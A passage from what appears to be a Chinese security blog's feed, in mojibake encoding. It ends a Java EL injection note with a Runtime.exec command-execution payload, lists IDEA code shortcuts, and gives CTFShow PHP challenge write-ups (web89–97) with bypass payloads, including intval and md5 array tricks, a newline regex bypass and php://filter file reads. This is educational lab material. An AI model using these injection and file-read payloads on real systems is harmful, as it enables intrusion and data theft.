<li><code>getInputStream()æ–¹æ³•</code>ç”¨äºè·å–æµç¨‹å’Œå­æµç¨‹çš„è¾“å…¥æµã€‚</li>
<li><code>getInputStream()æ–¹æ³•</code>æ˜¯ä¸€ä¸ªéé™æ€æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡ç±»å¯¹è±¡è®¿é—®ï¼Œå¦‚æœå°è¯•ä½¿ç”¨ç±»åç§°è®¿é—®è¯¥æ–¹æ³•ï¼Œåˆ™ä¼šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚</li>
<li>è¿”å›è¾“å…¥æµæ—¶ï¼Œ<code>getInputStream()æ–¹æ³•</code>ä¸ä¼šå¼•å‘å¼‚å¸¸ã€‚</li>
</ul>
</li>
</ul>
<p>pagecontextåŸŸæ§åˆ¶request.getSession()è°ƒç”¨å…¶ä¸­çš„getAttributeï¼ŒgetAttributeæ–¹æ³•å–å‡ºä»»æ„å€¼aï¼Œ<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>å§<code>java.lang.Runtime</code>åå°„å‡ºæ¥ï¼Œè°ƒç”¨<code>java.lang.Runtime</code> ä¸­çš„æ–¹æ³•<code>getMethodï¼ˆï¼‰</code> ï¼Œè·å¾—ç›¸åº”å¯¹è±¡çš„getRuntime()æ–¹æ³•,å¾—åˆ°ç›¸å…³çš„Methodå¯¹è±¡ï¼Œ<code>invoke(null,null)</code> åå°„å¾—åˆ°exec()æ–¹æ³•ï¼ŒgetInputStream()æ–¹æ³•ç®€è€Œè¨€ä¹‹å°±æ˜¯å¯ä»¥æœ‰å›æ˜¾ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEAå¿«æ·ç”Ÿæˆä»£ç </title>
    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‡†å¤‡å§JAVAä½œä¸ºä¸»è¦ä½¿ç”¨è¯­è¨€å†™POCï¼Œæ‰€æœ‰è®°ä¸€ä¸‹</p>
<span id="more"></span>

<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//ç”Ÿæˆmainæ–¹æ³•:
public static void main(String[] args) &#123;&#125;
</code></pre>
<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//ç”Ÿæˆæ‰“å°è¾“å‡º:
System.out.println();
</code></pre>
<h1 id="â€œabcâ€-sout"><a href="#â€œabcâ€-sout" class="headerlink" title="â€œabcâ€.sout"></a>â€œabcâ€.sout</h1><pre><code>//ç”Ÿæˆæ‰“å°å­—ç¬¦ä¸²:
System.out.println(&quot;adc&quot;);
</code></pre>
<h1 id="â€œabcâ€-format"><a href="#â€œabcâ€-format" class="headerlink" title="â€œabcâ€.format"></a>â€œabcâ€.format</h1><pre><code>//ç”Ÿæˆå­—ç¬¦ä¸²æ ¼å¼åŒ–:
String.format(&quot;abc&quot; )
</code></pre>
<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //ç”Ÿæˆforå¾ªç¯
 for (int i = 0; i &lt; list.size(); i++) &#123;
    String s =  list.get(i);
 &#125;
</code></pre>
<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// ç”ŸæˆCollectionè¿­ä»£å™¨
 for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
     String next =  iterator.next();   
 &#125;
</code></pre>
<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///ç”Ÿæˆå¢å¼ºforå¾ªç¯
 for (String s : list) &#123;       
 &#125;
</code></pre>
<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///ç”Ÿæˆ enumerationéå†
 while (enumeration.hasMoreElements()) &#123;
    Object nextElement =  enumeration.nextElement();   
 &#125;
</code></pre>
<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///ç”Ÿæˆæ•°ç»„forå¾ªç¯
 int[] array = &#123;12345&#125;;
 for (int i = 0; i &lt; array.length; i++) &#123;
    int i1 = array[i]; 
 &#125;
</code></pre>
<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///ç”Ÿæˆè¿­ä»£å™¨ iterator
 Iterator iterator = list.iterator();
 while (iterator.hasNext()) &#123;
    Object next =  iterator.next();
 &#125;
</code></pre>
<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  ç”ŸæˆString tokenéå†</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”ŸæˆAxis2 web serviceè°ƒç”¨</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="try-å¦‚-â€abcâ€-try"><a href="#try-å¦‚-â€abcâ€-try" class="headerlink" title="try å¦‚:â€abcâ€.try"></a>try å¦‚:â€abcâ€.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// ç”Ÿæˆtry.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆåˆ¤æ–­æ˜¯å¦ä¸ºç©º  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>

<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆåˆ¤æ–­æ˜¯å¦ä¸ä¸ºç©º  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆç®€å•forå¾ªç¯</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆæ˜¯å¦æ˜¯è¯¥å¯¹è±¡å¼•ç”¨</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆ å…±æœ‰ é™æ€æœ€ç»ˆçš„</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>

<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆ å…±æœ‰ é™æ€æœ€ç»ˆçš„ int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>

<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///ç”Ÿæˆ å…±æœ‰ é™æ€æœ€ç»ˆçš„ String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>è¯­è¨€å­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow-PHPç‰¹æ€§</title>
    <url>/WP/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ–°å§¿åŠ¿ï¼Œè®°å½•è®°å½•ã€‚</p>
<span id="more"></span>


<h1 id="WEB89"><a href="#WEB89" class="headerlink" title="WEB89"></a>WEB89</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç”±äº<code>intval(array(&#39;&#39;))==1</code>ï¼Œæ•…ç›´æ¥æ•°ç»„ç»•è¿‡</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num[]=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¯´æ˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡½æ•°ï¼š<span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line">è¯´æ˜ï¼šbase=<span class="number">0</span>æ—¶ï¼Œ</span><br><span class="line">é€šè¿‡æ£€æµ‹ <span class="keyword">var</span> çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</span><br><span class="line">å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† <span class="string">&quot;0x&quot;</span> (æˆ– <span class="string">&quot;0X&quot;</span>) çš„å‰ç¼€ï¼Œä½¿ç”¨ <span class="number">16</span> è¿›åˆ¶ (hex)ï¼›</span><br><span class="line">å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="string">&quot;0&quot;</span> å¼€å§‹ï¼Œä½¿ç”¨ <span class="number">8</span> è¿›åˆ¶(octal)ï¼›</span><br><span class="line">å¦åˆ™ï¼Œå°†ä½¿ç”¨ <span class="number">10</span> è¿›åˆ¶ (decimal)ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">4476</span> <span class="comment"># ç©ºæ ¼</span></span><br><span class="line">?num=<span class="number">0x117c</span> <span class="comment"># åå…­è¿›åˆ¶</span></span><br><span class="line">?num=<span class="number">010574</span> <span class="comment"># å…«è¿›åˆ¶</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>/i</code>åŒ¹é…å¤§å°å†™ï¼Œ<code>/m</code>åŒ¹é…å¤šè¡Œæ•°æ®ã€‚<code>/^php$/m</code>è¿™ç§å½¢å¼èƒ½ç”¨<code>%0a</code>ç»•è¿‡ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>aphp</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œä½†æ˜¯ä¸å¤ªç†è§£</span></span><br><span class="line">?cmd=php%<span class="number">0</span>a%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿˜æ˜¯ä¸€æ ·çš„Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>è¯´æ˜</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡½æ•°ï¼š<span class="title function_ invoke__">strpos</span>(<span class="keyword">string</span>, find [,start])</span><br><span class="line">è¯´æ˜ï¼š</span><br><span class="line"><span class="keyword">string</span>æ˜¯è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼›findæ˜¯è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ï¼›startæ˜¯è§„å®šå¼€å§‹æœç´¢çš„ä½ç½®ã€‚</span><br><span class="line">è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› <span class="literal">FALSE</span>ã€‚</span><br><span class="line">æ³¨é‡Šï¼šå­—ç¬¦ä¸²ä½ç½®ä» <span class="number">0</span> å¼€å§‹ï¼Œä¸æ˜¯ä» <span class="number">1</span> å¼€å§‹ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br><span class="line">?num=<span class="number">4476.0</span>    <span class="comment">#ç”±äºintval()åªè¯†åˆ«æ•´æ•°éƒ¨åˆ†</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;<span class="comment">//è¡¨æ˜è¦å­˜åœ¨0ä¸”ä¸åœ¨é¦–ä½</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç”¨<code>8è¿›åˆ¶</code>è¡¨ç¤ºæ³•ç»•è¿‡4476æ•°å­—ã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br></pre></td></tr></table></figure>


<h1 id="web96-è·¯å¾„é—®é¢˜"><a href="#web96-è·¯å¾„é—®é¢˜" class="headerlink" title="web96(è·¯å¾„é—®é¢˜)"></a>web96(è·¯å¾„é—®é¢˜)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php #åˆ©ç”¨LFIæ¥æŸ¥çœ‹æºç </span></span><br><span class="line">/<span class="keyword">var</span>/www/html/flag.php              ç»å¯¹è·¯å¾„</span><br><span class="line">./flag.php                          ç›¸å¯¹è·¯å¾„</span><br><span class="line">php:<span class="comment">//filter/resource=flag.php      phpä¼ªåè®® </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>åˆ©ç”¨<code>æ•°ç»„</code>è¿›è¡Œç»•è¿‡å³å¯å¾—åˆ°flag</p>
<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


